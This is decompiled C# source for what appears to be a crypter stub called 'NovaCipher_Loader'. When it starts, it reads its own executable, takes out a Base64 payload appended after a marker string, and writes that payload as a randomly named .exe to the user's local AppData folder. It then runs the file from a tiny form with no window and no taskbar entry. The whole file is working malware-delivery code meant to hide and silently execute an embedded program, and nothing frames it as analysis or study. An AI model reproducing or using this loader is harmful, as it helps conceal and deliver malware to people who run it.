using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;

namespace NovaCipher_Loader;

public class frmMain : Form
{
	private IContainer components;

	private Process processController;

	public frmMain()
	{
		InitializeComponent();
	}

	private void frmMain_Load(object sender, EventArgs e)
	{
		//IL_00af: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string[] separator = new string[1] { "<NOVACIPHER1.0.0>" };
			string localAppDataFolder = GetLocalAppDataFolder();
			Random random = new Random();
			string text = random.Next(90000, 90000000).ToString();
			string text2 = localAppDataFolder + "\\" + text + ".exe";
			StreamReader streamReader = new StreamReader(GetFullExecutablePath());
			string text3 = streamReader.ReadToEnd();
			string[] array = text3.Split(separator, StringSplitOptions.None);
			byte[] bytes = Convert.FromBase64String(array[1]);
			File.WriteAllBytes(text2, bytes);
			processController.StartInfo.FileName = text2;
			processController.Start();
			((Form)this).Close();
		}
		catch
		{
			MessageBox.Show("Failed to open self.");
			((Form)this).Close();
		}
	}

	private string ConvertByteArrayToString(byte[] byteArray)
	{
		Encoding uTF = Encoding.UTF8;
		return uTF.GetString(byteArray);
	}

	private string GetFolder(Environment.SpecialFolder spcFolder)
	{
		return Environment.GetFolderPath(spcFolder);
	}

	private string GetSystemFolder()
	{
		return GetFolder(Environment.SpecialFolder.System);
	}

	private string GetMyDocumentsFolder()
	{
		return GetFolder(Environment.SpecialFolder.Personal);
	}

	private string GetMyPicturesFolder()
	{
		return GetFolder(Environment.SpecialFolder.MyPictures);
	}

	private string GetProgramFilesFolder()
	{
		return GetFolder(Environment.SpecialFolder.ProgramFiles);
	}

	private string GetRecentFilesFolder()
	{
		return GetFolder(Environment.SpecialFolder.Recent);
	}

	private string GetStartFolder()
	{
		return GetFolder(Environment.SpecialFolder.StartMenu);
	}

	private string GetLocalAppDataFolder()
	{
		return GetFolder(Environment.SpecialFolder.LocalApplicationData);
	}

	private string GetCurrentFolder()
	{
		return Environment.CurrentDirectory;
	}

	private string GetCurrentExecutableName()
	{
		GetCurrentFolder();
		int startIndex = Application.get_ExecutablePath().LastIndexOf("\\");
		string text = Application.get_ExecutablePath().Substring(startIndex);
		return text.Replace("\\", "");
	}

	private string GetFullExecutablePath()
	{
		return GetCurrentFolder() + "\\" + GetCurrentExecutableName();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		processController = new Process();
		((Control)this).SuspendLayout();
		processController.EnableRaisingEvents = true;
		processController.StartInfo.Domain = "";
		processController.StartInfo.LoadUserProfile = false;
		processController.StartInfo.Password = null;
		processController.StartInfo.StandardErrorEncoding = null;
		processController.StartInfo.StandardOutputEncoding = null;
		processController.StartInfo.UserName = "";
		processController.SynchronizingObject = (ISynchronizeInvoke?)this;
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Form)this).set_ControlBox(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("frmMain");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_TransparencyKey(SystemColors.ButtonFace);
		((Form)this).add_Load((EventHandler)frmMain_Load);
		((Control)this).ResumeLayout(false);
	}
}
